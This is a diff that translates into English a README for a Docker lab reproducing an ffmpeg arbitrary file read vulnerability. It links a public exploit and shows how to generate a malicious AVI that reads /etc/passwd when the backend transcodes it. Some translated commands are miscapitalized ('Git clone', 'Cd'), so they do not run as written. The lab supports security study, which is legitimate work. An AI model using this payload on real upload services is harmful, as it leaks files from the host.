@@ -1,37 +1,37 @@
-# ffmpeg 任意文件读取漏洞环境
+# ffmpeg arbitrary file read vulnerability environment
 
-参考资料：
+Reference materials:
 
- - http://bobao.360.cn/learning/detail/4032.html
- - https://hackerone.com/reports/242831
- - https://github.com/neex/ffmpeg-avi-m3u-xbin
+  - http://bobao.360.cn/learning/detail/4032.html
+  - https://hackerone.com/reports/242831
+  - https://github.com/neex/ffmpeg-avi-m3u-xbin
 
-## 环境搭建
+## Environment Building
 
-编译及启动环境
-
-```
-docker-compose build
-docker-compose up -d
-```
-
-环境启动后监听8080端口，访问`http://your-ip:8080/`即可查看。
-
-## 漏洞利用
-
-漏洞原理不再赘述，直接下载exp，并生成payload：
+Compile and start the environment
 
 ```
-# 下载exp
-git clone https://github.com/neex/ffmpeg-avi-m3u-xbin
-cd ffmpeg-avi-m3u-xbin
+Docker-compose build
+Docker-compose up -d
+```
 
-# 生成payload
+After the environment starts, listen to port 8080 and visit `http://your-ip:8080/` to view it.
+
+## Vulnerability
+
+The vulnerability principle is no longer described, download exp directly, and generate payload:
+
+```
+# download exp
+Git clone https://github.com/neex/ffmpeg-avi-m3u-xbin
+Cd ffmpeg-avi-m3u-xbin
+
+#产生payload
 ./gen_xbin_avi.py file:///etc/passwd exp.avi
 ```
 
-生成exp.avi，在`http://your-ip:8080/`上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：
+Generate exp.avi and upload it at `http://your-ip:8080/`. The backend will display the video you uploaded with ffmpeg and transcode it. When transcoding, any file read vulnerability in ffmpeg can be read into the video:
 
 ![](01.png)
 
-你也可以执行`docker-compose exec web bash`进入本环境内部，测试ffmpeg。
+You can also execute `docker-compose exec web bash` to enter the environment and test ffmpeg.
